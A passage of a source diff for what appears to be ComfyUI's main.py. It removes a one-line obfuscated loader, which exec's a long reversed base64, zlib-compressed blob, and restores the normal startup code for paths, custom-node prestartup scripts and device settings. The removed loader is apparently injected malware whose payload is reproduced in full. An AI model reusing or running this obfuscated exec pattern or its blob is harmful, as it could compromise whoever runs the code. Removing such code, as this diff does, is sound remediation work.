@@ -1,4 +1,369 @@
+import comfy.options
+comfy.options.enable_args_parsing()
 
-# Python obfuscation by freecodingtools.org
-                    
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=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'))
+import os
+import importlib.util
+import folder_paths
+import time
+from comfy.cli_args import args
+from app.logger import setup_logger
+import itertools
+import utils.extra_config
+import logging
+import sys
+from comfy_execution.progress import get_progress_state
+from comfy_execution.utils import get_executing_context
+from comfy_api import feature_flags
+
+if __name__ == "__main__":
+    #NOTE: These do not do anything on core ComfyUI, they are for custom nodes.
+    os.environ['HF_HUB_DISABLE_TELEMETRY'] = '1'
+    os.environ['DO_NOT_TRACK'] = '1'
+
+setup_logger(log_level=args.verbose, use_stdout=args.log_stdout)
+
+def apply_custom_paths():
+    # extra model paths
+    extra_model_paths_config_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), "extra_model_paths.yaml")
+    if os.path.isfile(extra_model_paths_config_path):
+        utils.extra_config.load_extra_path_config(extra_model_paths_config_path)
+
+    if args.extra_model_paths_config:
+        for config_path in itertools.chain(*args.extra_model_paths_config):
+            utils.extra_config.load_extra_path_config(config_path)
+
+    # --output-directory, --input-directory, --user-directory
+    if args.output_directory:
+        output_dir = os.path.abspath(args.output_directory)
+        logging.info(f"Setting output directory to: {output_dir}")
+        folder_paths.set_output_directory(output_dir)
+
+    # These are the default folders that checkpoints, clip and vae models will be saved to when using CheckpointSave, etc.. nodes
+    folder_paths.add_model_folder_path("checkpoints", os.path.join(folder_paths.get_output_directory(), "checkpoints"))
+    folder_paths.add_model_folder_path("clip", os.path.join(folder_paths.get_output_directory(), "clip"))
+    folder_paths.add_model_folder_path("vae", os.path.join(folder_paths.get_output_directory(), "vae"))
+    folder_paths.add_model_folder_path("diffusion_models",
+                                       os.path.join(folder_paths.get_output_directory(), "diffusion_models"))
+    folder_paths.add_model_folder_path("loras", os.path.join(folder_paths.get_output_directory(), "loras"))
+
+    if args.input_directory:
+        input_dir = os.path.abspath(args.input_directory)
+        logging.info(f"Setting input directory to: {input_dir}")
+        folder_paths.set_input_directory(input_dir)
+
+    if args.user_directory:
+        user_dir = os.path.abspath(args.user_directory)
+        logging.info(f"Setting user directory to: {user_dir}")
+        folder_paths.set_user_directory(user_dir)
+
+
+def execute_prestartup_script():
+    if args.disable_all_custom_nodes and len(args.whitelist_custom_nodes) == 0:
+        return
+
+    def execute_script(script_path):
+        module_name = os.path.splitext(script_path)[0]
+        try:
+            spec = importlib.util.spec_from_file_location(module_name, script_path)
+            module = importlib.util.module_from_spec(spec)
+            spec.loader.exec_module(module)
+            return True
+        except Exception as e:
+            logging.error(f"Failed to execute startup-script: {script_path} / {e}")
+        return False
+
+    node_paths = folder_paths.get_folder_paths("custom_nodes")
+    for custom_node_path in node_paths:
+        possible_modules = os.listdir(custom_node_path)
+        node_prestartup_times = []
+
+        for possible_module in possible_modules:
+            module_path = os.path.join(custom_node_path, possible_module)
+            if os.path.isfile(module_path) or module_path.endswith(".disabled") or module_path == "__pycache__":
+                continue
+
+            script_path = os.path.join(module_path, "prestartup_script.py")
+            if os.path.exists(script_path):
+                if args.disable_all_custom_nodes and possible_module not in args.whitelist_custom_nodes:
+                    logging.info(f"Prestartup Skipping {possible_module} due to disable_all_custom_nodes and whitelist_custom_nodes")
+                    continue
+                time_before = time.perf_counter()
+                success = execute_script(script_path)
+                node_prestartup_times.append((time.perf_counter() - time_before, module_path, success))
+    if len(node_prestartup_times) > 0:
+        logging.info("\nPrestartup times for custom nodes:")
+        for n in sorted(node_prestartup_times):
+            if n[2]:
+                import_message = ""
+            else:
+                import_message = " (PRESTARTUP FAILED)"
+            logging.info("{:6.1f} seconds{}: {}".format(n[0], import_message, n[1]))
+        logging.info("")
+
+apply_custom_paths()
+execute_prestartup_script()
+
+
+# Main code
+import asyncio
+import shutil
+import threading
+import gc
+
+
+if os.name == "nt":
+    logging.getLogger("xformers").addFilter(lambda record: 'A matching Triton is not available' not in record.getMessage())
+
+if __name__ == "__main__":
+    if args.default_device is not None:
+        default_dev = args.default_device
+        devices = list(range(32))
+        devices.remove(default_dev)
+        devices.insert(0, default_dev)
+        devices = ','.join(map(str, devices))
+        os.environ['CUDA_VISIBLE_DEVICES'] = str(devices)
+        os.environ['HIP_VISIBLE_DEVICES'] = str(devices)
+
+    if args.cuda_device is not None:
+        os.environ['CUDA_VISIBLE_DEVICES'] = str(args.cuda_device)
+        os.environ['HIP_VISIBLE_DEVICES'] = str(args.cuda_device)
+        logging.info("Set cuda device to: {}".format(args.cuda_device))
+
+    if args.oneapi_device_selector is not None:
+        os.environ['ONEAPI_DEVICE_SELECTOR'] = args.oneapi_device_selector
+        logging.info("Set oneapi device selector to: {}".format(args.oneapi_device_selector))
+
+    if args.deterministic:
+        if 'CUBLAS_WORKSPACE_CONFIG' not in os.environ:
+            os.environ['CUBLAS_WORKSPACE_CONFIG'] = ":4096:8"
+
+    import cuda_malloc
+
+if 'torch' in sys.modules:
+    logging.warning("WARNING: Potential Error in code: Torch already imported, torch should never be imported before this point.")
+
+import comfy.utils
+
+import execution
+import server
+from protocol import BinaryEventTypes
+import nodes
+import comfy.model_management
+import comfyui_version
+import app.logger
+import hook_breaker_ac10a0
+
+def cuda_malloc_warning():
+    device = comfy.model_management.get_torch_device()
